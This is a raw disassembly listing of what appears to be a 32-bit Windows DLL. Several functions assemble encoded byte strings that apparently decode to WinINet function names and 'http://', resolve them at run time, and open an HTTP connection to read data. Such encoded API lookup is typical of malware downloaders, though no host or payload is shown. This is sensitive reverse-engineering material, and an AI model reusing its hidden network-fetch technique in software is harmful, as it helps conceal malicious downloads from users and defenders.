10003168:	c6 45 db 0d          	movb   $0xd,-0x25(%ebp)
1000316c:	c6 45 dc 06          	movb   $0x6,-0x24(%ebp)
10003170:	c6 45 dd 36          	movb   $0x36,-0x23(%ebp)
10003174:	c6 45 de 11          	movb   $0x11,-0x22(%ebp)
10003178:	c6 45 df 19          	movb   $0x19,-0x21(%ebp)
1000317c:	c6 45 e0 10          	movb   $0x10,-0x20(%ebp)
10003180:	c6 45 e1 3e          	movb   $0x3e,-0x1f(%ebp)
10003184:	88 5d e2             	mov    %bl,-0x1e(%ebp)
10003187:	c6 45 88 36          	movb   $0x36,-0x78(%ebp)
1000318b:	c6 45 89 11          	movb   $0x11,-0x77(%ebp)
1000318f:	c6 45 8a 0b          	movb   $0xb,-0x76(%ebp)
10003193:	c6 45 8b 1a          	movb   $0x1a,-0x75(%ebp)
10003197:	c6 45 8c 0d          	movb   $0xd,-0x74(%ebp)
1000319b:	c6 45 8d 11          	movb   $0x11,-0x73(%ebp)
1000319f:	c6 45 8e 1a          	movb   $0x1a,-0x72(%ebp)
100031a3:	c6 45 8f 0b          	movb   $0xb,-0x71(%ebp)
100031a7:	c6 45 90 3c          	movb   $0x3c,-0x70(%ebp)
100031ab:	c6 45 91 13          	movb   $0x13,-0x6f(%ebp)
100031af:	c6 45 92 10          	movb   $0x10,-0x6e(%ebp)
100031b3:	c6 45 93 0c          	movb   $0xc,-0x6d(%ebp)
100031b7:	c6 45 94 1a          	movb   $0x1a,-0x6c(%ebp)
100031bb:	c6 45 95 37          	movb   $0x37,-0x6b(%ebp)
100031bf:	c6 45 96 1e          	movb   $0x1e,-0x6a(%ebp)
100031c3:	c6 45 97 11          	movb   $0x11,-0x69(%ebp)
100031c7:	c6 45 98 1b          	movb   $0x1b,-0x68(%ebp)
100031cb:	c6 45 99 13          	movb   $0x13,-0x67(%ebp)
100031cf:	c6 45 9a 1a          	movb   $0x1a,-0x66(%ebp)
100031d3:	88 5d 9b             	mov    %bl,-0x65(%ebp)
100031d6:	c6 85 68 ff ff ff 36 	movb   $0x36,-0x98(%ebp)
100031dd:	c6 85 69 ff ff ff 11 	movb   $0x11,-0x97(%ebp)
100031e4:	c6 85 6a ff ff ff 0b 	movb   $0xb,-0x96(%ebp)
100031eb:	c6 85 6b ff ff ff 1a 	movb   $0x1a,-0x95(%ebp)
100031f2:	c6 85 6c ff ff ff 0d 	movb   $0xd,-0x94(%ebp)
100031f9:	c6 85 6d ff ff ff 11 	movb   $0x11,-0x93(%ebp)
10003200:	c6 85 6e ff ff ff 1a 	movb   $0x1a,-0x92(%ebp)
10003207:	c6 85 6f ff ff ff 0b 	movb   $0xb,-0x91(%ebp)
1000320e:	c6 85 70 ff ff ff 2d 	movb   $0x2d,-0x90(%ebp)
10003215:	c6 85 71 ff ff ff 1a 	movb   $0x1a,-0x8f(%ebp)
1000321c:	c6 85 72 ff ff ff 1e 	movb   $0x1e,-0x8e(%ebp)
10003223:	c6 85 73 ff ff ff 1b 	movb   $0x1b,-0x8d(%ebp)
1000322a:	c6 85 74 ff ff ff 39 	movb   $0x39,-0x8c(%ebp)
10003231:	c6 85 75 ff ff ff 16 	movb   $0x16,-0x8b(%ebp)
10003238:	c6 85 76 ff ff ff 13 	movb   $0x13,-0x8a(%ebp)
1000323f:	c6 85 77 ff ff ff 1a 	movb   $0x1a,-0x89(%ebp)
10003246:	88 9d 78 ff ff ff    	mov    %bl,-0x88(%ebp)
1000324c:	c6 45 b0 36          	movb   $0x36,-0x50(%ebp)
10003250:	c6 45 b1 11          	movb   $0x11,-0x4f(%ebp)
10003254:	c6 45 b2 0b          	movb   $0xb,-0x4e(%ebp)
10003258:	c6 45 b3 1a          	movb   $0x1a,-0x4d(%ebp)
1000325c:	c6 45 b4 0d          	movb   $0xd,-0x4c(%ebp)
10003260:	c6 45 b5 11          	movb   $0x11,-0x4b(%ebp)
10003264:	c6 45 b6 1a          	movb   $0x1a,-0x4a(%ebp)
10003268:	c6 45 b7 0b          	movb   $0xb,-0x49(%ebp)
1000326c:	c6 45 b8 2c          	movb   $0x2c,-0x48(%ebp)
10003270:	c6 45 b9 1a          	movb   $0x1a,-0x47(%ebp)
10003274:	c6 45 ba 0b          	movb   $0xb,-0x46(%ebp)
10003278:	c6 45 bb 30          	movb   $0x30,-0x45(%ebp)
1000327c:	c6 45 bc 0f          	movb   $0xf,-0x44(%ebp)
10003280:	c6 45 bd 0b          	movb   $0xb,-0x43(%ebp)
10003284:	c6 45 be 16          	movb   $0x16,-0x42(%ebp)
10003288:	c6 45 bf 10          	movb   $0x10,-0x41(%ebp)
1000328c:	c6 45 c0 11          	movb   $0x11,-0x40(%ebp)
10003290:	c6 45 c1 3e          	movb   $0x3e,-0x3f(%ebp)
10003294:	88 5d c2             	mov    %bl,-0x3e(%ebp)
10003297:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000329a:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
100032a0:	50                   	push   %eax
100032a1:	e8 48 43 00 00       	call   0x100075ee
100032a6:	59                   	pop    %ecx
100032a7:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
100032ad:	50                   	push   %eax
100032ae:	ff 15 14 e1 00 10    	call   *0x1000e114
100032b4:	a3 90 07 01 10       	mov    %eax,0x10010790
100032b9:	3b c3                	cmp    %ebx,%eax
100032bb:	0f 84 30 01 00 00    	je     0x100033f1
100032c1:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
100032c7:	50                   	push   %eax
100032c8:	e8 21 43 00 00       	call   0x100075ee
100032cd:	8d 45 c4             	lea    -0x3c(%ebp),%eax
100032d0:	50                   	push   %eax
100032d1:	e8 18 43 00 00       	call   0x100075ee
100032d6:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
100032dc:	50                   	push   %eax
100032dd:	e8 0c 43 00 00       	call   0x100075ee
100032e2:	8d 45 9c             	lea    -0x64(%ebp),%eax
100032e5:	50                   	push   %eax
100032e6:	e8 03 43 00 00       	call   0x100075ee
100032eb:	8d 45 d4             	lea    -0x2c(%ebp),%eax
100032ee:	50                   	push   %eax
100032ef:	e8 fa 42 00 00       	call   0x100075ee
100032f4:	8d 45 88             	lea    -0x78(%ebp),%eax
100032f7:	50                   	push   %eax
100032f8:	e8 f1 42 00 00       	call   0x100075ee
100032fd:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
10003303:	50                   	push   %eax
10003304:	e8 e5 42 00 00       	call   0x100075ee
10003309:	8d 45 b0             	lea    -0x50(%ebp),%eax
1000330c:	50                   	push   %eax
1000330d:	e8 dc 42 00 00       	call   0x100075ee
10003312:	83 c4 20             	add    $0x20,%esp
10003315:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
1000331b:	50                   	push   %eax
1000331c:	ff 35 90 07 01 10    	push   0x10010790
10003322:	8b 35 1c e1 00 10    	mov    0x1000e11c,%esi
10003328:	ff d6                	call   *%esi
1000332a:	a3 70 07 01 10       	mov    %eax,0x10010770
1000332f:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10003332:	50                   	push   %eax
10003333:	ff 35 90 07 01 10    	push   0x10010790
10003339:	ff d6                	call   *%esi
1000333b:	a3 88 07 01 10       	mov    %eax,0x10010788
10003340:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
10003346:	50                   	push   %eax
10003347:	ff 35 90 07 01 10    	push   0x10010790
1000334d:	ff d6                	call   *%esi
1000334f:	a3 74 07 01 10       	mov    %eax,0x10010774
10003354:	8d 45 9c             	lea    -0x64(%ebp),%eax
10003357:	50                   	push   %eax
10003358:	ff 35 90 07 01 10    	push   0x10010790
1000335e:	ff d6                	call   *%esi
10003360:	a3 78 07 01 10       	mov    %eax,0x10010778
10003365:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10003368:	50                   	push   %eax
10003369:	ff 35 90 07 01 10    	push   0x10010790
1000336f:	ff d6                	call   *%esi
10003371:	a3 7c 07 01 10       	mov    %eax,0x1001077c
10003376:	8d 45 88             	lea    -0x78(%ebp),%eax
10003379:	50                   	push   %eax
1000337a:	ff 35 90 07 01 10    	push   0x10010790
10003380:	ff d6                	call   *%esi
10003382:	a3 80 07 01 10       	mov    %eax,0x10010780
10003387:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
1000338d:	50                   	push   %eax
1000338e:	ff 35 90 07 01 10    	push   0x10010790
10003394:	ff d6                	call   *%esi
10003396:	a3 84 07 01 10       	mov    %eax,0x10010784
1000339b:	8d 45 b0             	lea    -0x50(%ebp),%eax
1000339e:	50                   	push   %eax
1000339f:	ff 35 90 07 01 10    	push   0x10010790
100033a5:	ff d6                	call   *%esi
100033a7:	a3 8c 07 01 10       	mov    %eax,0x1001078c
100033ac:	39 1d 70 07 01 10    	cmp    %ebx,0x10010770
100033b2:	74 3d                	je     0x100033f1
100033b4:	39 1d 88 07 01 10    	cmp    %ebx,0x10010788
100033ba:	74 35                	je     0x100033f1
100033bc:	39 1d 74 07 01 10    	cmp    %ebx,0x10010774
100033c2:	74 2d                	je     0x100033f1
100033c4:	39 1d 78 07 01 10    	cmp    %ebx,0x10010778
100033ca:	74 25                	je     0x100033f1
100033cc:	39 1d 7c 07 01 10    	cmp    %ebx,0x1001077c
100033d2:	74 1d                	je     0x100033f1
100033d4:	39 1d 80 07 01 10    	cmp    %ebx,0x10010780
100033da:	74 15                	je     0x100033f1
100033dc:	39 1d 84 07 01 10    	cmp    %ebx,0x10010784
100033e2:	74 0d                	je     0x100033f1
100033e4:	3b c3                	cmp    %ebx,%eax
100033e6:	74 09                	je     0x100033f1
100033e8:	e8 88 3b 00 00       	call   0x10006f75
100033ed:	85 c0                	test   %eax,%eax
100033ef:	75 10                	jne    0x10003401
100033f1:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
100033f4:	eb 0b                	jmp    0x10003401
100033f6:	6a 01                	push   $0x1
100033f8:	58                   	pop    %eax
100033f9:	c3                   	ret
100033fa:	8b 65 e8             	mov    -0x18(%ebp),%esp
100033fd:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10003401:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10003405:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10003408:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000340b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003412:	5f                   	pop    %edi
10003413:	5e                   	pop    %esi
10003414:	5b                   	pop    %ebx
10003415:	c9                   	leave
10003416:	c3                   	ret
10003417:	55                   	push   %ebp
10003418:	8b ec                	mov    %esp,%ebp
1000341a:	6a ff                	push   $0xffffffff
1000341c:	68 78 e2 00 10       	push   $0x1000e278
10003421:	68 00 c6 00 10       	push   $0x1000c600
10003426:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000342c:	50                   	push   %eax
1000342d:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10003434:	83 ec 10             	sub    $0x10,%esp
10003437:	53                   	push   %ebx
10003438:	56                   	push   %esi
10003439:	57                   	push   %edi
1000343a:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000343d:	33 db                	xor    %ebx,%ebx
1000343f:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10003442:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10003445:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000344c:	8b 75 10             	mov    0x10(%ebp),%esi
1000344f:	56                   	push   %esi
10003450:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10003453:	50                   	push   %eax
10003454:	ff 75 08             	push   0x8(%ebp)
10003457:	e8 82 00 00 00       	call   0x100034de
1000345c:	83 c4 0c             	add    $0xc,%esp
1000345f:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003462:	3b c3                	cmp    %ebx,%eax
10003464:	7e 32                	jle    0x10003498
10003466:	89 06                	mov    %eax,(%esi)
10003468:	40                   	inc    %eax
10003469:	50                   	push   %eax
1000346a:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10003470:	59                   	pop    %ecx
10003471:	8b 7d 0c             	mov    0xc(%ebp),%edi
10003474:	89 07                	mov    %eax,(%edi)
10003476:	3b fb                	cmp    %ebx,%edi
10003478:	75 04                	jne    0x1000347e
1000347a:	89 1e                	mov    %ebx,(%esi)
1000347c:	eb 1a                	jmp    0x10003498
1000347e:	8b 0e                	mov    (%esi),%ecx
10003480:	41                   	inc    %ecx
10003481:	51                   	push   %ecx
10003482:	53                   	push   %ebx
10003483:	50                   	push   %eax
10003484:	e8 8d 9e 00 00       	call   0x1000d316
10003489:	ff 36                	push   (%esi)
1000348b:	ff 75 e4             	push   -0x1c(%ebp)
1000348e:	ff 37                	push   (%edi)
10003490:	e8 87 9e 00 00       	call   0x1000d31c
10003495:	83 c4 18             	add    $0x18,%esp
10003498:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000349b:	e8 07 00 00 00       	call   0x100034a7
100034a0:	eb 27                	jmp    0x100034c9
100034a2:	33 db                	xor    %ebx,%ebx
100034a4:	8b 75 10             	mov    0x10(%ebp),%esi
100034a7:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
100034aa:	74 0d                	je     0x100034b9
100034ac:	ff 75 e4             	push   -0x1c(%ebp)
100034af:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
100034b5:	59                   	pop    %ecx
100034b6:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
100034b9:	c3                   	ret
100034ba:	eb 0d                	jmp    0x100034c9
100034bc:	6a 01                	push   $0x1
100034be:	58                   	pop    %eax
100034bf:	c3                   	ret
100034c0:	8b 65 e8             	mov    -0x18(%ebp),%esp
100034c3:	8b 75 10             	mov    0x10(%ebp),%esi
100034c6:	83 26 00             	andl   $0x0,(%esi)
100034c9:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100034cd:	8b 06                	mov    (%esi),%eax
100034cf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100034d2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100034d9:	5f                   	pop    %edi
100034da:	5e                   	pop    %esi
100034db:	5b                   	pop    %ebx
100034dc:	c9                   	leave
100034dd:	c3                   	ret
100034de:	55                   	push   %ebp
100034df:	8b ec                	mov    %esp,%ebp
100034e1:	6a ff                	push   $0xffffffff
100034e3:	68 90 e2 00 10       	push   $0x1000e290
100034e8:	68 00 c6 00 10       	push   $0x1000c600
100034ed:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100034f3:	50                   	push   %eax
100034f4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100034fb:	83 ec 20             	sub    $0x20,%esp
100034fe:	53                   	push   %ebx
100034ff:	56                   	push   %esi
10003500:	57                   	push   %edi
10003501:	89 65 e8             	mov    %esp,-0x18(%ebp)
10003504:	33 ff                	xor    %edi,%edi
10003506:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10003509:	89 7d d4             	mov    %edi,-0x2c(%ebp)
1000350c:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000350f:	c7 45 d0 04 00 00 00 	movl   $0x4,-0x30(%ebp)
10003516:	57                   	push   %edi
10003517:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000351a:	50                   	push   %eax
1000351b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000351e:	50                   	push   %eax
1000351f:	68 05 00 00 20       	push   $0x20000005
10003524:	ff 75 08             	push   0x8(%ebp)
10003527:	ff 15 7c 07 01 10    	call   *0x1001077c
1000352d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10003530:	3b c7                	cmp    %edi,%eax
10003532:	74 55                	je     0x10003589
10003534:	8b 4d 10             	mov    0x10(%ebp),%ecx
10003537:	89 01                	mov    %eax,(%ecx)
10003539:	50                   	push   %eax
1000353a:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10003540:	59                   	pop    %ecx
10003541:	8b 75 0c             	mov    0xc(%ebp),%esi
10003544:	89 06                	mov    %eax,(%esi)
10003546:	3b c7                	cmp    %edi,%eax
10003548:	74 3f                	je     0x10003589
1000354a:	ff 75 e4             	push   -0x1c(%ebp)
1000354d:	57                   	push   %edi
1000354e:	50                   	push   %eax
1000354f:	e8 c2 9d 00 00       	call   0x1000d316
10003554:	83 c4 0c             	add    $0xc,%esp
10003557:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000355a:	3b f8                	cmp    %eax,%edi
1000355c:	73 2b                	jae    0x10003589
1000355e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
10003561:	51                   	push   %ecx
10003562:	2b c7                	sub    %edi,%eax
10003564:	50                   	push   %eax
10003565:	8b 06                	mov    (%esi),%eax
10003567:	03 c7                	add    %edi,%eax
10003569:	50                   	push   %eax
1000356a:	ff 75 08             	push   0x8(%ebp)
1000356d:	ff 15 84 07 01 10    	call   *0x10010784
10003573:	83 f8 01             	cmp    $0x1,%eax
10003576:	75 11                	jne    0x10003589
10003578:	03 7d d4             	add    -0x2c(%ebp),%edi
1000357b:	89 7d e0             	mov    %edi,-0x20(%ebp)
1000357e:	eb d7                	jmp    0x10003557
10003580:	6a 01                	push   $0x1
10003582:	58                   	pop    %eax
10003583:	c3                   	ret
10003584:	8b 65 e8             	mov    -0x18(%ebp),%esp
10003587:	33 ff                	xor    %edi,%edi
10003589:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000358d:	8b c7                	mov    %edi,%eax
1000358f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10003592:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003599:	5f                   	pop    %edi
1000359a:	5e                   	pop    %esi
1000359b:	5b                   	pop    %ebx
1000359c:	c9                   	leave
1000359d:	c3                   	ret
1000359e:	55                   	push   %ebp
1000359f:	8b ec                	mov    %esp,%ebp
100035a1:	6a ff                	push   $0xffffffff
100035a3:	68 a0 e2 00 10       	push   $0x1000e2a0
100035a8:	68 00 c6 00 10       	push   $0x1000c600
100035ad:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100035b3:	50                   	push   %eax
100035b4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100035bb:	83 ec 30             	sub    $0x30,%esp
100035be:	53                   	push   %ebx
100035bf:	56                   	push   %esi
100035c0:	57                   	push   %edi
100035c1:	89 65 e8             	mov    %esp,-0x18(%ebp)
100035c4:	6a 01                	push   $0x1
100035c6:	58                   	pop    %eax
100035c7:	89 45 e0             	mov    %eax,-0x20(%ebp)
100035ca:	33 db                	xor    %ebx,%ebx
100035cc:	89 5d cc             	mov    %ebx,-0x34(%ebp)
100035cf:	89 5d d8             	mov    %ebx,-0x28(%ebp)
100035d2:	89 5d dc             	mov    %ebx,-0x24(%ebp)
100035d5:	c6 45 d0 17          	movb   $0x17,-0x30(%ebp)
100035d9:	c6 45 d1 0b          	movb   $0xb,-0x2f(%ebp)
100035dd:	c6 45 d2 0b          	movb   $0xb,-0x2e(%ebp)
100035e1:	c6 45 d3 0f          	movb   $0xf,-0x2d(%ebp)
100035e5:	c6 45 d4 45          	movb   $0x45,-0x2c(%ebp)
100035e9:	c6 45 d5 50          	movb   $0x50,-0x2b(%ebp)
100035ed:	c6 45 d6 50          	movb   $0x50,-0x2a(%ebp)
100035f1:	88 5d d7             	mov    %bl,-0x29(%ebp)
100035f4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100035f7:	89 45 fc             	mov    %eax,-0x4(%ebp)
100035fa:	8b 45 0c             	mov    0xc(%ebp),%eax
100035fd:	8d 70 01             	lea    0x1(%eax),%esi
10003600:	56                   	push   %esi
10003601:	8b 3d c0 e1 00 10    	mov    0x1000e1c0,%edi
10003607:	ff d7                	call   *%edi
10003609:	59                   	pop    %ecx
1000360a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000360d:	3b c3                	cmp    %ebx,%eax
1000360f:	0f 84 e0 00 00 00    	je     0x100036f5
10003615:	56                   	push   %esi
10003616:	53                   	push   %ebx
10003617:	50                   	push   %eax
10003618:	e8 f9 9c 00 00       	call   0x1000d316
1000361d:	ff 75 0c             	push   0xc(%ebp)
10003620:	ff 75 08             	push   0x8(%ebp)
10003623:	ff 75 e4             	push   -0x1c(%ebp)
10003626:	8b 35 b4 e1 00 10    	mov    0x1000e1b4,%esi
1000362c:	ff d6                	call   *%esi
1000362e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10003631:	89 45 cc             	mov    %eax,-0x34(%ebp)
10003634:	89 5d d8             	mov    %ebx,-0x28(%ebp)
10003637:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
1000363a:	53                   	push   %ebx
1000363b:	68 28 01 01 10       	push   $0x10010128
10003640:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
10003643:	51                   	push   %ecx
10003644:	8d 4d d8             	lea    -0x28(%ebp),%ecx
10003647:	51                   	push   %ecx
10003648:	50                   	push   %eax
10003649:	e8 c0 0b 00 00       	call   0x1000420e
1000364e:	8b 45 d8             	mov    -0x28(%ebp),%eax
10003651:	89 45 dc             	mov    %eax,-0x24(%ebp)
10003654:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003657:	50                   	push   %eax
10003658:	e8 91 3f 00 00       	call   0x100075ee
1000365d:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003660:	50                   	push   %eax
10003661:	ff 75 e4             	push   -0x1c(%ebp)
10003664:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
1000366a:	83 c4 38             	add    $0x38,%esp
1000366d:	89 45 c8             	mov    %eax,-0x38(%ebp)
10003670:	3b c3                	cmp    %ebx,%eax
10003672:	74 0d                	je     0x10003681
10003674:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003677:	50                   	push   %eax
10003678:	e8 e3 9c 00 00       	call   0x1000d360
1000367d:	59                   	pop    %ecx
1000367e:	01 45 e4             	add    %eax,-0x1c(%ebp)
10003681:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003684:	50                   	push   %eax
10003685:	ff 75 d8             	push   -0x28(%ebp)
10003688:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
1000368e:	59                   	pop    %ecx
1000368f:	59                   	pop    %ecx
10003690:	89 45 c8             	mov    %eax,-0x38(%ebp)
10003693:	3b c3                	cmp    %ebx,%eax
10003695:	74 0d                	je     0x100036a4
10003697:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000369a:	50                   	push   %eax
1000369b:	e8 c0 9c 00 00       	call   0x1000d360
100036a0:	59                   	pop    %ecx
100036a1:	01 45 d8             	add    %eax,-0x28(%ebp)
100036a4:	ff 75 e4             	push   -0x1c(%ebp)
100036a7:	e8 b4 9c 00 00       	call   0x1000d360
100036ac:	89 45 14             	mov    %eax,0x14(%ebp)
100036af:	40                   	inc    %eax
100036b0:	89 45 c0             	mov    %eax,-0x40(%ebp)
100036b3:	50                   	push   %eax
100036b4:	ff d7                	call   *%edi
100036b6:	59                   	pop    %ecx
100036b7:	59                   	pop    %ecx
100036b8:	8b 4d 10             	mov    0x10(%ebp),%ecx
100036bb:	89 01                	mov    %eax,(%ecx)
100036bd:	3b c3                	cmp    %ebx,%eax
100036bf:	74 34                	je     0x100036f5
100036c1:	ff 75 c0             	push   -0x40(%ebp)
100036c4:	53                   	push   %ebx
100036c5:	50                   	push   %eax
100036c6:	e8 4b 9c 00 00       	call   0x1000d316
100036cb:	ff 75 c0             	push   -0x40(%ebp)
100036ce:	ff 75 e4             	push   -0x1c(%ebp)
100036d1:	8b 45 10             	mov    0x10(%ebp),%eax
100036d4:	ff 30                	push   (%eax)
100036d6:	ff d6                	call   *%esi
100036d8:	ff 75 d8             	push   -0x28(%ebp)
100036db:	e8 80 9c 00 00       	call   0x1000d360
100036e0:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
100036e3:	89 01                	mov    %eax,(%ecx)
100036e5:	40                   	inc    %eax
100036e6:	50                   	push   %eax
100036e7:	ff d7                	call   *%edi
100036e9:	83 c4 20             	add    $0x20,%esp
100036ec:	8b 4d 18             	mov    0x18(%ebp),%ecx
100036ef:	89 01                	mov    %eax,(%ecx)
100036f1:	3b c3                	cmp    %ebx,%eax
100036f3:	75 05                	jne    0x100036fa
100036f5:	89 5d e0             	mov    %ebx,-0x20(%ebp)
100036f8:	eb 1f                	jmp    0x10003719
100036fa:	8b 7d 1c             	mov    0x1c(%ebp),%edi
100036fd:	8b 0f                	mov    (%edi),%ecx
100036ff:	41                   	inc    %ecx
10003700:	51                   	push   %ecx
10003701:	53                   	push   %ebx
10003702:	50                   	push   %eax
10003703:	e8 0e 9c 00 00       	call   0x1000d316
10003708:	8b 07                	mov    (%edi),%eax
1000370a:	40                   	inc    %eax
1000370b:	50                   	push   %eax
1000370c:	ff 75 d8             	push   -0x28(%ebp)
1000370f:	8b 45 18             	mov    0x18(%ebp),%eax
10003712:	ff 30                	push   (%eax)
10003714:	ff d6                	call   *%esi
10003716:	83 c4 18             	add    $0x18,%esp
10003719:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000371c:	e8 04 00 00 00       	call   0x10003725
10003721:	eb 34                	jmp    0x10003757
10003723:	33 db                	xor    %ebx,%ebx
10003725:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
10003728:	74 0d                	je     0x10003737
1000372a:	ff 75 cc             	push   -0x34(%ebp)
1000372d:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10003733:	59                   	pop    %ecx
10003734:	89 5d cc             	mov    %ebx,-0x34(%ebp)
10003737:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
1000373a:	74 0d                	je     0x10003749
1000373c:	ff 75 dc             	push   -0x24(%ebp)
1000373f:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10003745:	59                   	pop    %ecx
10003746:	89 5d dc             	mov    %ebx,-0x24(%ebp)
10003749:	c3                   	ret
1000374a:	eb 0b                	jmp    0x10003757
1000374c:	6a 01                	push   $0x1
1000374e:	58                   	pop    %eax
1000374f:	c3                   	ret
10003750:	8b 65 e8             	mov    -0x18(%ebp),%esp
10003753:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
10003757:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000375b:	8b 45 e0             	mov    -0x20(%ebp),%eax
1000375e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10003761:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003768:	5f                   	pop    %edi
10003769:	5e                   	pop    %esi
1000376a:	5b                   	pop    %ebx
1000376b:	c9                   	leave
1000376c:	c3                   	ret
1000376d:	55                   	push   %ebp
1000376e:	8b ec                	mov    %esp,%ebp
10003770:	6a ff                	push   $0xffffffff
10003772:	68 b8 e2 00 10       	push   $0x1000e2b8
10003777:	68 00 c6 00 10       	push   $0x1000c600
1000377c:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10003782:	50                   	push   %eax
10003783:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000378a:	83 ec 4c             	sub    $0x4c,%esp
1000378d:	53                   	push   %ebx
1000378e:	56                   	push   %esi
1000378f:	57                   	push   %edi
10003790:	89 65 e8             	mov    %esp,-0x18(%ebp)
10003793:	33 f6                	xor    %esi,%esi
10003795:	89 75 d0             	mov    %esi,-0x30(%ebp)
10003798:	89 75 cc             	mov    %esi,-0x34(%ebp)
1000379b:	89 75 e0             	mov    %esi,-0x20(%ebp)
1000379e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
100037a1:	89 75 d4             	mov    %esi,-0x2c(%ebp)
100037a4:	89 75 d8             	mov    %esi,-0x28(%ebp)
100037a7:	89 75 dc             	mov    %esi,-0x24(%ebp)
100037aa:	89 75 fc             	mov    %esi,-0x4(%ebp)
100037ad:	6a 01                	push   $0x1
100037af:	5b                   	pop    %ebx
100037b0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100037b3:	89 75 bc             	mov    %esi,-0x44(%ebp)
100037b6:	53                   	push   %ebx
100037b7:	68 24 01 01 10       	push   $0x10010124
100037bc:	8d 45 bc             	lea    -0x44(%ebp),%eax
100037bf:	50                   	push   %eax
100037c0:	8d 45 dc             	lea    -0x24(%ebp),%eax
100037c3:	50                   	push   %eax
100037c4:	ff 75 0c             	push   0xc(%ebp)
100037c7:	e8 42 0a 00 00       	call   0x1000420e
100037cc:	83 c4 14             	add    $0x14,%esp
100037cf:	56                   	push   %esi
100037d0:	56                   	push   %esi
100037d1:	6a 03                	push   $0x3
100037d3:	b8 6c 07 01 10       	mov    $0x1001076c,%eax
100037d8:	50                   	push   %eax
100037d9:	50                   	push   %eax
100037da:	6a 50                	push   $0x50
100037dc:	ff 75 0c             	push   0xc(%ebp)
100037df:	ff 75 08             	push   0x8(%ebp)
100037e2:	ff 15 70 07 01 10    	call   *0x10010770
100037e8:	89 45 cc             	mov    %eax,-0x34(%ebp)
100037eb:	3b c6                	cmp    %esi,%eax
100037ed:	75 0c                	jne    0x100037fb
100037ef:	c7 45 d0 9a e4 ff ff 	movl   $0xffffe49a,-0x30(%ebp)
100037f6:	e9 26 01 00 00       	jmp    0x10003921
100037fb:	89 75 e4             	mov    %esi,-0x1c(%ebp)
100037fe:	89 75 c0             	mov    %esi,-0x40(%ebp)
10003801:	ff 75 18             	push   0x18(%ebp)
10003804:	ff 75 14             	push   0x14(%ebp)
10003807:	ff 75 bc             	push   -0x44(%ebp)
1000380a:	ff 75 dc             	push   -0x24(%ebp)
1000380d:	8d 45 c0             	lea    -0x40(%ebp),%eax
10003810:	50                   	push   %eax
10003811:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10003814:	50                   	push   %eax
10003815:	e8 a2 01 00 00       	call   0x100039bc
1000381a:	83 c4 18             	add    $0x18,%esp
